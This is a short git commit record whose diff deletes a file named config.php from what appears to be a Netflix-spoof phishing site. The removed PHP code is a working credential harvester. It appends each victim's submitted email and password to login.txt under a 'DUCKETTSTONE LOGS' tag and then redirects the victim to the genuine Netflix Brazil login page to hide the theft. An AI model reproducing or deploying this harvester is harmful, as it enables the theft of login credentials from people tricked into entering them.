3aab130bdc00b678c182764fb28fb245803ab3b7
B-Max sites <alesandrohanzenofc@gmail.com>
2026-06-10 21:05:33 -0300

    Delete config.php

--- config.php
+++
@@ -1,5 +0,0 @@
-<?php 
-file_put_contents("login.txt", "[DUCKETTSTONE LOGS]" . "\n" . "Email: " . $_POST['userLoginId'] . "\n" . "Senha: " . $_POST['password'] . "\n", FILE_APPEND);
-header('location:https://www.netflix.com/br/login');
-exit();
-?>
